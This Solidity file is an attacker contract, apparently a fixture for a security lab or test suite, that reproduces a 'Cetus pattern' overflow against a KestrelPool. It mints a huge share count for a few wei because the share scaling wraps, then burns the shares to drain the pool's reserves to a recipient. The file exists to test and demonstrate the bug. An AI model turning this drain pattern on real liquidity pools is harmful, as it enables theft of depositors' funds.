// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelPool } from "kestrel/KestrelPool.sol";

/// @notice SC09 attacker (Cetus pattern): asks {KestrelPool.addLiquidityExactShares} for a
///         share count whose Q128 scaling wraps, pays a few wei for it, then burns the shares
///         for the pool's reserves.
contract ExactSharesAttacker {
    /// @notice Target pool.
    KestrelPool public immutable pool;

    /// @param _pool Target pool.
    constructor(KestrelPool _pool) {
        pool = _pool;
    }

    /// @notice Mint `shares` paying at most `maxPay` of each token, then remove them all.
    /// @param shares Shares to mint.
    /// @param maxPay Maximum of each token the attacker is willing to pay.
    /// @param to Profit recipient.
    /// @return paid0 token0 paid for the shares.
    /// @return paid1 token1 paid for the shares.
    function attack(uint256 shares, uint256 maxPay, address to)
        external
        returns (uint256 paid0, uint256 paid1)
    {
        IERC20 t0 = pool.token0();
        IERC20 t1 = pool.token1();
        t0.approve(address(pool), maxPay);
        t1.approve(address(pool), maxPay);
        (paid0, paid1) = pool.addLiquidityExactShares(shares, maxPay, maxPay, address(this));
        pool.removeLiquidity(pool.sharesOf(address(this)), address(this));
        t0.transfer(to, t0.balanceOf(address(this)));
        t1.transfer(to, t1.balanceOf(address(this)));
    }
}
